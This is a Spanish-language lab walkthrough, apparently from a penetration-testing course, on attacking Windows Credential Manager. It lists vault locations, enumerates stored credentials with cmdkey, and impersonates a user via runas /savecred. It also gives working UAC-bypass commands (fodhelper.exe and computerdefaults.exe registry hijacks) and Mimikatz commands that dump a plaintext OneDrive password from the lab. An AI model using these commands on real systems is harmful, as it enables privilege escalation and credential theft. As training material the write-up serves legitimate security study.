
# Atacando Windows Credential Manager

### Administrador de credenciales y bóveda de Windows

[El Administrador de Credenciales](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication#windows-vault-and-credential-manager) es una función integrada en Windows desde  `Server 2008 R2` y  `Windows 7`. No se dispone de documentación completa sobre su funcionamiento, pero, en esencia, permite a los usuarios y aplicaciones almacenar de forma segura las credenciales relevantes para otros sistemas y sitios web. Las credenciales se almacenan en carpetas cifradas especiales en el equipo, dentro de los perfiles de usuario y sistema ( [MITRE ATT\&CK](https://attack.mitre.org/techniques/T1555/004/) ).

* `%UserProfile%\AppData\Local\Microsoft\Vault\`
* `%UserProfile%\AppData\Local\Microsoft\Credentials\`
* `%UserProfile%\AppData\Roaming\Microsoft\Vault\`
* `%ProgramData%\Microsoft\Vault\`
* `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`

Cada carpeta de bóveda contiene un archivo `Policy.vpol` con claves AES (AES-128 o AES-256) protegidas por DPAPI. Estas claves AES se utilizan para cifrar las credenciales. Las versiones más recientes de Windows utilizan `Credential Guard` [seguridad basada en virtualización](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs) para proteger aún más las claves maestras DPAPI almacenándolas en enclaves de memoria seguros .

Microsoft suele referirse a los almacenes protegidos como `Credential Lockers`(anteriormente `Windows Vaults`). El Administrador de Credenciales es la función/API orientada al usuario, mientras que los almacenes cifrados reales son las carpetas de bóveda/bloqueo. La siguiente tabla enumera los dos tipos de almacenes de credenciales de Windows:

<table data-header-hidden><thead><tr><th width="198"></th><th></th></tr></thead><tbody><tr><td>Nombre</td><td>Descripción</td></tr><tr><td>Credenciales web</td><td>Credenciales asociadas a sitios web y cuentas en línea. Este bloqueo se utiliza en Internet Explorer y versiones anteriores de Microsoft Edge.</td></tr><tr><td>Credenciales de Windows</td><td>Se utiliza para almacenar tokens de inicio de sesión para varios servicios, como OneDrive, y credenciales relacionadas con usuarios del dominio, recursos de red local, servicios y directorios compartidos.</td></tr></tbody></table>

<figure><img src="/files/rTFKYotbA877naZGd7d7" alt=""><figcaption></figcaption></figure>

Es posible exportar las Bóvedas de Windows a archivos `.crd` mediante el Panel de Control o con el siguiente comando. Las copias de seguridad creadas de esta manera se cifran con una contraseña proporcionada por el usuario y pueden importarse a otros sistemas Windows.

```cmd-session
C:\Users\sadams> rundll32 keymgr.dll,KRShowKeyMgr
```

<figure><img src="/files/4ZTOBl78bAUAsHsxvViG" alt=""><figcaption></figcaption></figure>

### Enumeración de credenciales con cmdkey

Podemos usar [cmdkey](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) para enumerar las credenciales almacenadas en el perfil del usuario actual:

```cmd-session
C:\Users\sadams> whoami
srv01\sadams

C:\Users\sadams>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02hejubrtyqjrkfi
    Local machine persistence

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```

Las credenciales almacenadas se enumeran con el siguiente formato:

<table data-header-hidden><thead><tr><th width="165"></th><th></th></tr></thead><tbody><tr><td>Llave</td><td>Valor</td></tr><tr><td>Objetivo</td><td>El nombre del recurso o la cuenta a la que corresponde la credencial. Puede ser una computadora, un nombre de dominio o un identificador especial.</td></tr><tr><td>Tipo</td><td>El tipo de credencial. Los tipos más comunes son <code>Generic</code>para credenciales generales y <code>Domain Password</code>para inicios de sesión de usuarios de dominio.</td></tr><tr><td>Usuario</td><td>La cuenta de usuario asociada con la credencial.</td></tr><tr><td>Persistencia</td><td>Algunas credenciales indican si una credencial se guarda de forma persistente en la computadora; las credenciales marcadas con <code>Local machine persistence</code>sobreviven a los reinicios.</td></tr></tbody></table>

La primera credencial en la salida del comando anterior, `virtualapp/didlogical` es una credencial genérica utilizada por la cuenta Microsoft/servicios de Windows Live. El nombre de usuario, de aspecto aleatorio, es un ID de cuenta interno. Esta entrada puede ignorarse para nuestros fines.

La segunda credencial, `Domain:interactive=SRV01\mcharles`, es una credencial de dominio asociada al usuario SRV01\mcharles. Esto significa que se utiliza para sesiones de inicio de sesión `interactivas`. Siempre que encontremos este tipo de credencial, podemos usarla `runas` para suplantar la identidad del usuario almacenado, como se muestra a continuación:

```cmd-session
C:\Users\sadams> runas /savecred /user:SRV01\mcharles cmd
Attempting to start cmd as user "SRV01\mcharles" ...
```

<figure><img src="/files/kGu2eP3hPyLHtBZ82FUk" alt=""><figcaption></figcaption></figure>

### Extracción de credenciales con Mimikatz

Existen muchas herramientas diferentes para descifrar las credenciales almacenadas. Una de ellas es [mimikatz](https://github.com/gentilkiwi/mimikatz) . Incluso dentro de `mimikatz`, existen múltiples maneras de atacar estas credenciales: podemos volcarlas de la memoria usando el módulo `sekurlsa` o descifrarlas manualmente `dpapi`. En este ejemplo, usaremos `sekurlsa` como objetivo el proceso LSASS :

```cmd-session
C:\Users\Administrator\Desktop> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman

...SNIP...

Authentication Id : 0 ; 630472 (00000000:00099ec8)
Session           : RemoteInteractive from 3
User Name         : mcharles
Domain            : SRV01
Logon Server      : SRV01
Logon Time        : 4/27/2025 2:40:32 AM
SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
        credman :
         [00000000]
         * Username : mcharles@inlanefreight.local
         * Domain   : onedrive.live.com
         * Password : ...SNIP...

...SNIP...
```

{% hint style="info" %}
Nota: Algunas otras herramientas que pueden usarse para enumerar y extraer credenciales almacenadas incluyen [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) , [LaZagne](https://github.com/AlessandroZ/LaZagne) y [DonPAPI](https://github.com/login-securite/DonPAPI) .
{% endhint %}

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.16.138

RDP con usuario "sadams" y contraseña "totally2brow2harmon@"
```

> ¿Cuál es la contraseña que usa `mcharles` para OneDrive?

Nos conectamos por RDP:

```bash
xfreerdp /v:10.129.16.138 /u:sadams /p:totally2brow2harmon@ /drive:home,"/home/kali/Escritorio/hack-tools/WINDOWS"
```

Podríamos intentar exportar la bóveda de contraseñas con el siguiente comando:

```
C:\Users\sadams> rundll32 keymgr.dll,KRShowKeyMgr
```

<figure><img src="/files/908rADrhXNCeb9S85hIx" alt=""><figcaption></figcaption></figure>

Elegimos una ruta y un nombre y le ponemos la contraseña 1234:

<figure><img src="/files/S74qSWGzYOU7RvgeVbWD" alt=""><figcaption></figcaption></figure>

Nos genera el archivo .crd que podríamos importar en otros sistemas Windows, pero vamos a obtener las credenciales.

#### Enumerar credenciales con cmdkey

```
C:\Users\sadams>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```

Parece que no obtenemos ninguna credencial en plano pero vemos que hay credenciales guardadas en memoria del usuario mcharles.

### Impersonar al usuario mcharles

Usaremos las credenciales almacenadas en memoria para impersonar al usuario mcharles:

```
C:\Users\sadams> runas /user:SRV01\mcharles /savecred cmd
```

<figure><img src="/files/3iF4rYzxLFLwbKvEB5sB" alt=""><figcaption></figcaption></figure>

Herramientas de interfaz gráfica como Credential Manager y keymgr.dll no mostraban las credenciales de OneDrive. Las bóvedas y el registro también estaban vacíos. En este punto, era evidente que el laboratorio necesitaba acceso de administrador para continuar.

### Omitir el UAC mediante fodhelper.exe <a href="#id-9cac" id="id-9cac"></a>

Primero tenemos que omitir el UAC y luego obtenemos acceso de administrador.

Podemos usar dos payloads, puedes probar una carga útil que prefieras.

Usando `fodhelper.exe`:

```
reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe
```

Usando `computerdefaults.exe`:

```
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
```

Al abrir el CMD y escribir `whoami`, seguirá apareciendo que somos `mcharles`. Sin embargo, ahora podemos acceder a la carpeta del administrador y tener acceso completo.

```
C:\Windows\system32>whoami
srv01\mcharles

C:\Windows\system32>cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 03BC-D3A9

 Directory of C:\Users\Administrator\Desktop

04/27/2025  07:57 AM    <DIR>          .
04/27/2025  07:57 AM    <DIR>          ..
               0 File(s)              0 bytes
               2 Dir(s)   4,318,109,696 bytes free
```

Cómo nos hemos conectado por RDP compartiendo nuestra carpeta de hack-tools de nuestro Kali, enviaremos el binario de Mimikatz para extraer contraseñas.

<figure><img src="/files/aRi5r4ozOGC9OsXl450v" alt=""><figcaption></figcaption></figure>

La única ruta que tenemos accesible es la de `sadams`, por lo que la copiaremos en el escritorio:

<figure><img src="/files/OJJvwh5BxIWBxGZ8tg9B" alt=""><figcaption></figcaption></figure>

Una vez que tenemos Mimikatz en el escritorio de sadams, lo copiaremos a nuestra ruta actual:

```
C:\Users\Administrator\Desktop> copy C:\Users\sadams\Desktop\mimikatz.exe C:\Users\Administrator\Desktop
        1 file(s) copied.

C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 03BC-D3A9

 Directory of C:\Users\Administrator\Desktop

07/23/2025  01:30 PM    <DIR>          .
07/23/2025  01:30 PM    <DIR>          ..
09/19/2022  09:44 AM         1,355,264 mimikatz.exe
```

### Extraer vault con mimikatz

Ahora ejecutamos Mimikatz con `mimikatz.exe`:

```
C:\Users\Administrator\Desktop> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # vault::cred
TargetName : onedrive.live.com / <NULL>
UserName   : mcharles@inlanefreight.local
Comment    : <NULL>
Type       : 1 - generic
Persist    : 3 - enterprise
Flags      : 00000000
Credential : Inlanefreight#2025
Attributes : 0
```

Bingo! Obtenemos la contraseña de OneDrive en plano.
